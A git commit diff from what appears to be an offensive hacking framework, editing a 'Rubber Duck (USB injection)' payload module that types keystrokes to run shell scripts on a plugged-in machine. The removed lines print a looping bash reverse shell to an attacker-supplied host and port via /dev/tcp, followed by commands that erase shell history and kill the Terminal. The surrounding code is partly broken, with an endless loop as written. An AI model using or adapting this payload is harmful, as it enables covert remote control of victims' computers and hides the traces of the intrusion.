fa41d2b826e757b9748fc1e881faf44f18dd5c26
Entynetproject <43011806+entynetproject@users.noreply.github.com>
2019-06-30 12:17:41 +0300

    Update rubber_duck_payload.py

--- modules/payloads/rubber_duck_payload.py
+++ modules/payloads/rubber_duck_payload.py
@@ -6,12 +6,7 @@ class payload:
 		self.name = "Rubber Duck (USB injection)"
 		self.description = "Arduino payload that replicates keystrokes for shell script execution."
 		self.usage = "Install via https://"
-
-	def run(self,server):
-		while 1:
-				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done"
-
-		shell_command += "history -wc;killall Terminal"
+		
 		if os.path.exists("payloads") == False:
 			os.mkdir("payloads")
 		if os.path.exists("payloads/rubber_duck") == False:
